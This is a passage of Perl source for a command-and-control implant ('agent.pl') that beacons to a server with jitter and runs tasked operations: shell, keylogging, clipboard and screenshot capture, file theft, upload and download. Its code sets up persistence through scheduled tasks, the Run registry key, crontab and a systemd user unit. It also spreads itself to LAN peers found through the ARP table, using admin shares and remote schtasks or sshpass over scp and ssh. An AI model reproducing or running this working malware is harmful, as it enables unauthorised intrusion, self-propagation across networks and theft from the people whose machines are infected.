                   '/SC', 'ONLOGON', '/RL', 'HIGHEST', '/F') == 0) {
            $ok = 1;
            $detail .= "\nschtasks: scheduled ONLOGON (c2agent-persist)";
        } elsif (system('reg', 'add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run',
                        '/v', 'c2agent', '/t', 'REG_SZ', '/d', $wrapper, '/f') == 0) {
            $ok = 1;
            $detail .= "\nreg: HKCU Run key set (c2agent)";
        }
    } else {
        my $cronout = `(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo '\@reboot $cmd # c2agent-persist') | crontab - 2>&1`;
        my $cr_ok = $cronout =~ /^\s*$/ ? 1 : 0;
        $detail = $cr_ok ? 'crontab: @reboot hook installed (c2agent-persist)'
                         : "crontab: " . (($cronout =~ s/\s+/ /gr) =~ s/^\s+|\s+$//gr);
        my $unit = File::Spec->catfile($destdir, 'c2-update.service');
        if (open my $uf, '>', $unit) {
            print $uf "[Unit]\nDescription=c2 update\n\n[Service]\nType=simple\n"
                    . "ExecStart=/bin/sh -c " . shell_escape($cmd) . "\n"
                    . "Restart=always\n\n[Install]\nWantedBy=default.target\n";
            close $uf;
        }
        my $sctlmark = `systemctl --user daemon-reload >/dev/null 2>&1; if systemctl --user enable --now c2-update.service >/dev/null 2>&1; then echo __OK__; else echo __FAIL__; fi`;
        my $sys_ok = $sctlmark =~ /__OK__/ ? 1 : 0;
        $detail .= "\nsystemctl: user unit failed" unless $sys_ok;
        $ok = $cr_ok || $sys_ok;
    }
    my $output = "persistence: copied self to $dest";
    $output .= "\n$detail" if length $detail;
    $output = "persistence: failed\n$output" unless $ok;
    return (truncate_output($output), $ok ? 0 : 1);
}

# -------------------------------------------------------------------- lateral

sub lateral_discover {
    my ($base, $own) = @_;
    my $raw = `arp -a 2>/dev/null`;
    $raw .= "\n" . `ip neigh 2>/dev/null` unless os_name() eq 'windows';
    my %seen;
    my @peers;
    while ($raw =~ /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g) {
        my $ip = $1;
        next if $ip eq $own;
        next if length($ip) < length($base) + 1;
        next unless substr($ip, 0, length($base)) eq $base;
        next unless substr($ip, length($base), 1) eq '.';
        next if $seen{$ip}++;
        push @peers, $ip;
    }
    @peers = sort @peers;
    @peers = @peers[0 .. 29] if @peers > 30;
    return @peers;
}

sub lateral_win_deploy {
    my ($host, $user, $pass) = @_;
    my $self = $0 || 'agent.pl';
    my $bname = basename($self);
    my $share = "\\\\" . $host . "\\admin\$";
    my $nout = qx{net use "$share" /user:$user "$pass" 2>&1};
    my $nrc = $? >> 8;
    if ($nrc != 0) {
        my $err = ($nout =~ s/\s+/ /gr) =~ s/^\s+|\s+$//gr;
        return "failed (net use: $err)";
    }
    my $selfw = winpath($self);
    my $cout = qx{cmd /c copy /y "$selfw" "$share\\$bname" 2>&1};
    my $crc = $? >> 8;
    if ($crc != 0) {
        my $err = ($cout =~ s/\s+/ /gr) =~ s/^\s+|\s+$//gr;
        qx{net use "$share" /delete /y >NUL 2>&1};
        return "failed (copy: $err)";
    }
    my $terr = qx{schtasks /Create /S $host /TN "c2agent-lateral" /TR "$share\\$bname" /SC ONLOGON /RU $user /RP "$pass" /RL HIGHEST /F 2>&1};
    my $trc = $? >> 8;
    qx{net use "$share" /delete /y >NUL 2>&1};
    return "deployed (file dropped + scheduled c2agent-lateral)" if $trc == 0;
    my $err = ($terr =~ s/\s+/ /gr) =~ s/^\s+|\s+$//gr;
    return "deployed (file dropped; task: $err)";
}

sub lateral_unix_deploy {
    my ($host, $user, $pass) = @_;
    my $self = $0 || 'agent.pl';
    my $bname = basename($self);
    my $srv = $server; $srv =~ s|/+$||;
    my $iv = $interval;
    my $jt = $jitter;
    unless (`command -v sshpass 2>/dev/null` =~ /\S/) {
        return "skipped (sshpass not installed)";
    }
    my $scp = qq{sshpass -p '$pass' scp -o StrictHostKeyChecking=no -o ConnectTimeout=8 '$self' '$user\@$host:/tmp/$bname' 2>&1; echo __RC:\$?};
    my $sout = `$scp`;
    my ($src) = $sout =~ /__RC:(\d+)/;
    $src = 1 unless defined $src;
    if ($src != 0) {
        my $err = (($sout =~ s/__RC:\d+//gr) =~ s/\s+/ /gr) =~ s/^\s+|\s+$//gr;
        return "failed (scp: $err)";
    }
    my $relaunch = qq{$^X /tmp/$bname --server "$srv" --token "$token" --interval $iv --jitter $jt};
    my $remcmd = "'" . $relaunch . "' &>/dev/null &";
    my $ssh = qq{sshpass -p '$pass' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 '$user\@$host' $remcmd 2>&1; echo __RC:\$?};
    my $lout = `$ssh`;
    my ($lrc) = $lout =~ /__RC:(\d+)/;
    $lrc = 1 unless defined $lrc;
    return "deployed (file uploaded + launched)" if $lrc == 0;
    my $err = (($lout =~ s/__RC:\d+//gr) =~ s/\s+/ /gr) =~ s/^\s+|\s+$//gr;
    return "deployed (file uploaded; launch: $err)";
}

sub task_lateral {
    my ($args) = @_;
    my $subnet = $args->{subnet} // '';
    my $user = $args->{user} // ($ENV{C2_LAT_USER} // '');
    my $pass = $args->{pass} // ($ENV{C2_LAT_PASS} // '');
    my $own = local_ip();
    my $base = $subnet =~ /^(\d+\.\d+\.\d+)/ ? $1 : '';
    unless ($base) {
        $base = $own =~ /^(\d+\.\d+\.\d+)/ ? $1 : '';
    }
    return ("lateral: no LAN peers found", 1) unless $base;

    my @peers = lateral_discover($base, $own);
    return ("lateral: no LAN peers found", 1) unless @peers;

    my $os = os_name();
    my ($n, $depl, $fail, $skip) = (0, 0, 0, 0);
    my (@plist, @lines);
    for my $host (@peers) {
        $n++;
        push @plist, $host;
        my $status;
        if (!$user && !$pass) {
            $status = 'skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)';
            $skip++;
        } else {
            if ($os eq 'windows') {
                $status = lateral_win_deploy($host, $user, $pass);
            } else {
                $status = lateral_unix_deploy($host, $user, $pass);
            }
            if    ($status =~ /^deployed/) { $depl++; }
            elsif ($status =~ /^failed/)   { $fail++; }
            elsif ($status =~ /^skipped/)  { $skip++; }
        }
        push @lines, "  $host: $status";
    }
    my $output = join("\n",
        "lateral: $n peer(s): " . join(', ', @plist),
        @lines,
        "lateral: deployed=$depl failed=$fail skipped=$skip");
    return (truncate_output($output), 0);
}

# ----------------------------------------------------------------- clone

sub task_clone {
    my ($args) = @_;
    my $action   = lc($args->{action} || 'start');
    my $target   = ($args->{target} || '') =~ s/^\s+|\s+$//gr;
    my $command  = ($args->{command} || '') =~ s/^\s+|\s+$//gr;
    my $interval = 30;
    eval { $interval = int($args->{interval} || 30); $interval = 5 if $interval < 5; $interval = 3600 if $interval > 3600; };
    $target = $agent_id unless length $target;

    if ($action eq 'stop') {
        my $e = $clones{$target};
        return ("clone: no watcher for $target", 1) unless $e;
        $e->{stop} = 1;
        delete $clones{$target};
        return ("clone: watcher for $target stopped", 0);
    }

    if ($action eq 'status') {
        return ("clone: no watchers running", 0) unless %clones;
        my @lines;
        for my $tid (sort keys %clones) {
            my $i = $clones{$tid};
            push @lines, "  $tid: "
                       . ($i->{status} // '?') . " | "
                       . "last_check " . ($i->{last_check} // '?') . " | "
                       . "relaunched " . ($i->{relaunches} || 0) . "x | "
                       . "cmd: " . ($i->{command} || '(none)');
        }
        return ("clone watchers:\n" . join("\n", @lines), 0);
    }

    # start
    return ("clone: watcher for $target already running", 1) if exists $clones{$target};
    return ("clone: 'command' (relaunch cmd) required", 1) unless length $command;

    $clones{$target} = {
        status     => 'starting',
        last_check => 'never',
        relaunches => 0,
        command    => $command,
        interval   => $interval,
        stop       => 0,
        next_check => time() + $interval,
    };
    return ("clone: watcher started on target $target (every ${interval}s, restart cmd: $command)", 0);
}

sub clone_tick {
    return unless %clones;
    my $now = time();
    for my $target (keys %clones) {
        my $e = $clones{$target};
        next if $e->{stop};
        next if $now < $e->{next_check};
        $e->{next_check} = $now + $e->{interval};
        # check target status
        my $res = get_url("/api/clone/status/$target");
        if ($res->{code} == 404) {
            $e->{status}     = 'unknown';
            $e->{last_check} = 'target gone';
        } elsif ($res->{code} == 200) {
            my $data = eval { decode_json($res->{body}) } // {};
            my $st = $data->{status} // 'unknown';
            $e->{status}     = $st;
            $e->{last_check} = _now_str();
            if (($st eq 'dead' || $st eq 'stale') && length($e->{command})) {
                $e->{relaunches}++;
                logmsg("clone: target $target $st -> relaunching");
                if ($^O =~ /mswin|mingw|cygwin/i) {
                    system('start', '', '/b', 'cmd', '/c', $e->{command});
                } else {
                    system("nohup sh -c " . shell_escape($e->{command}) . " >/dev/null 2>&1 &");
                }
            }
        } else {
            $e->{status}     = "http $res->{code}";
            $e->{last_check} = _now_str();
        }
    }
}

sub _now_str {
    my @t = gmtime();
    return sprintf('%04d-%02d-%02d %02d:%02d:%02d',
                   $t[5]+1900, $t[4]+1, $t[3], $t[2], $t[1], $t[0]);
}

sub execute_task {
    my ($task) = @_;
    my $task_id = $task->{task_id};
    my $type    = $task->{type};
    my $args    = $task->{args} // {};
    logmsg("running task $task_id ($type)");

    if ($type eq 'shell') {
        my $timeout = $args->{timeout} // $SHELL_TIMEOUT;
        $timeout = 1 if $timeout < 1;
        $timeout = 3600 if $timeout > 3600;
        return run_shell($args->{command} // '', $timeout);
    }
    elsif ($type eq 'download') { return task_download($task_id, $args); }
    elsif ($type eq 'upload')   { return task_upload($task_id, $args); }
    elsif ($type eq 'sleep')    { return task_sleep($args); }
    elsif ($type eq 'keylog')   { return task_keylog($args); }
    elsif ($type eq 'clipboard'){ return task_clipboard($args); }
    elsif ($type eq 'screenshot'){ return task_screenshot($task_id, $args); }
    elsif ($type eq 'steal')    { return task_steal($task_id, $args); }
    elsif ($type eq 'clone')    { return task_clone($args); }
    elsif ($type eq 'persistence') { return task_persistence($args); }
    elsif ($type eq 'lateral')     { return task_lateral($args); }
    elsif ($type eq 'exit')     { return ('exiting', 0, 1); } # should_exit flag
    else                        { return ("unknown task type: $type", 1); }
}

# ----------------------------------------------------------------- main

my $show_help = 0;
GetOptions(
    'server=s'   => \$server,
    'token=s'    => \$token,
    'interval=i' => \$interval,
    'jitter=i'   => \$jitter,
    'state=s'    => \$state_file,
    'verbose'    => \$verbose,
    'help|h'     => \$show_help,
) or die "usage: perl agent.pl --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n";

if ($show_help) {
    print "usage: perl agent.pl --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n";
    print "\n";
    print "Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):\n";
    print "  --server URL      server base URL (required unless C2_SERVER is set)\n";
    print "  --token TOKEN     shared agent token (required unless C2_TOKEN is set)\n";
    print "  --interval N      heartbeat interval in seconds (default 10, min 1)\n";
    print "  --jitter N        random jitter in seconds added to the interval\n";
    print "  --state FILE      state file persisting the agent id (default ~/.c2agent.json)\n";
    print "  --verbose         print activity to stdout\n";
    print "  -h, --help        show this help and exit\n";
    exit(0);
}

$server = $ENV{C2_SERVER} // '' unless $server;
$token  = $ENV{C2_TOKEN}  // '' unless $token;
if ($state_file) {
    $STATE_FILE = $state_file;
} elsif ($ENV{C2_STATE_FILE}) {
    $STATE_FILE = $ENV{C2_STATE_FILE};
}

die "usage: perl agent.pl --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n"
    unless $server && $token;

$server =~ s|/+$||;

load_id();
register() unless $agent_id;

logmsg("agent running against $server (interval ${interval}s)");

while (1) {
    my @tasks = checkin();
    clone_tick();
    for my $task (@tasks) {
        my ($output, $exit_code, $should_exit) = execute_task($task);
        report($task->{task_id}, $output, $exit_code, '');
        if ($should_exit) {
            logmsg("exit task received — shutting down");
            exit(0);
        }
    }
    my $delay = $interval + ($jitter > 0 ? int(rand($jitter + 1)) : 0);
    sleep($delay);
}
